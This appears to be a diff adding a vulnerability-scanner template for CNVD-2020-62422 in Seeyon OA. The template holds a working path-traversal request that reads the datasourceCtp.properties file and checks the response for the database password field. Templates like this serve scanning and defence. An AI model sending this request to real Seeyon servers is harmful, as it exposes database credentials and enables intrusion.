@@ -1,0 +1,32 @@
+http:
+    - matchers:
+        - status:
+            - 200
+          type: status
+        - condition: and
+          part: header
+          type: word
+          words:
+            - application/x-msdownload
+        - condition: and
+          part: body
+          type: word
+          words:
+            - ctpDataSource.password
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties'
+id: CNVD-2020-62422
+info:
+    author: pikpikcu
+    description: Seeyon is vulnerable to local file inclusion.
+    metadata:
+        max-request: 1
+    name: Seeyon - Local File Inclusion
+    reference:
+        - https://blog.csdn.net/m0_46257936/article/details/113150699
+    severity: medium
+    tags:
+        - cnvd2020
+        - seeyon
